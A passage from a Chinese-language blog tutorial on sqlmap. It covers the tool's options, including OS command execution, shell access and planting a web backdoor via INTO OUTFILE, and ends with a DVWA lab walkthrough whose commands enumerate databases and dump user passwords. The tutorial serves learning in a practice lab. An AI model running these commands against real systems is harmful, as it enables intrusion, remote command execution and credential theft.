+可以在以下三种情况下使用：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
+</span></span><span class=line><span class=cl>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
+</span></span><span class=line><span class=cl>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
+</span></span></code></pre></div><p><strong>运行自定义的SQL语句</strong>
+参数：&ndash;sql-query,&ndash;sql-shell
+sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
+如果是SELECT查询语句，sqlmap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python</span> sqlmap.py -u <span class=s2>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+</span></span></span><span class=line><span class=cl><span class=s2>id=1&amp;Submit=Submit#&#34;</span> --sql-query <span class=s2>&#34;SELECT &#39;magedu&#39;&#34;</span> -v1
+</span></span></code></pre></div><p>运行任意操作系统命令
+参数：&ndash;os-cmd,&ndash;os-shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> -
+</span></span><span class=line><span class=cl>-cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low&#34;</span> -p id --os-cmd id
+</span></span></code></pre></div><p>用&ndash;os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
+当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>1、ASP
+</span></span><span class=line><span class=cl>2、ASP.NET
+</span></span><span class=line><span class=cl>3、JSP
+</span></span><span class=line><span class=cl>4、PHP
+</span></span></code></pre></div><p>爬行网站URL
+参数：&ndash;crawl
+sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。此时的URL可以不带参数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+</span></span></span><span class=line><span class=cl><span class=s2>id=1&amp;Submit=Submit#&#34;</span> --batch --crawl<span class=o>=</span><span class=m>3</span>
+</span></span></code></pre></div><pre tabindex=0><code>python sqlmap.py -u &#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+id=1&amp;Submit=Submit#&#34; --batch --crawl=3
+</code></pre><p><strong>定义dump数据的格式</strong>
+参数：&ndash;dump-format
+输出的格式可定义为：CSV，HTML，SQLITE</p><p><strong>自定义输出的路径</strong>
+参数：&ndash;output-dir
+sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：&ndash;output-dir=/tmp</p><h2 id=4-实际利用dvwa>4 实际利用(dvwa)</h2><p>当给sqlmap这么一个url的时候，它会：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>1、判断可注入的参数
+</span></span><span class=line><span class=cl>2、判断可以用那种SQL注入技术来注入
+</span></span><span class=line><span class=cl>3、识别出哪种数据库
+</span></span><span class=line><span class=cl>4、根据用户选择，读取哪些数据
+</span></span></code></pre></div><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>0、只显示python错误以及严重的信息。
+</span></span><span class=line><span class=cl>1、同时显示基本信息和警告信息。（默认）
+</span></span><span class=line><span class=cl>2、同时显示debug信息。
+</span></span><span class=line><span class=cl>3、同时显示注入的payload。
+</span></span><span class=line><span class=cl>4、同时显示HTTP请求。
+</span></span><span class=line><span class=cl>5、同时显示HTTP响应头。
+</span></span><span class=line><span class=cl>6、同时显示HTTP响应页面。
+</span></span></code></pre></div><p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 判断注入点，因系统需要登录所以要加 cookie</span>
+</span></span><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -p id --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 检测站点包含哪些数据库</span>
+</span></span><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -p id --dbs --batch
+</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326220843373.png data-srcset="/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326220843373.png, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326220843373.png 1.5x, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326220843373.png 2x" data-sizes=auto alt=/images/SQLmap安装和使用/image-20230326220843373.png title=image-20230326220843373></p><blockquote><p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“&ndash;batch”命令来自动答复和判断</p></blockquote><p>可以看到有四个数据库，选择dvwa数据库获取其中的表名</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa --tables --batch
+</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222505503.png data-srcset="/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222505503.png, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222505503.png 1.5x, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222505503.png 2x" data-sizes=auto alt=/images/SQLmap安装和使用/image-20230326222505503.png title=image-20230326222505503></p><p>可以看到，dvwa里面有两张表，分别是guestbook，users。选择users表获取表中的字段</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa -T users --columns
+</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222602983.png data-srcset="/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222602983.png, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222602983.png 1.5x, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222602983.png 2x" data-sizes=auto alt=/images/SQLmap安装和使用/image-20230326222602983.png title=image-20230326222602983></p><p>可以看到里面有password，直接获取我们想要的内容 (账号/密码)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa -T users -C last_name,password  --dump --batch
+</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222852891.png data-srcset="/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222852891.png, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222852891.png 1.5x, /images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222852891.png 2x" data-sizes=auto alt=/images/SQLmap安装和使用/image-20230326222852891.png title=image-20230326222852891></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-03-26</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/ data-title=SQLmap安装和使用><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Hacker News" data-sharer=hackernews data-url=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/ data-title=SQLmap安装和使用><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/ data-title=SQLmap安装和使用><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/ data-title=SQLmap安装和使用><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ class=prev rel=prev title=常见sql注入漏洞><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>常见sql注入漏洞</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{},search:{highlightTag:"em",lunrIndexURL:"/index.json",lunrLanguageCode:"zh",lunrSegmentitURL:"/lib/lunr/lunr.segmentit.js",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
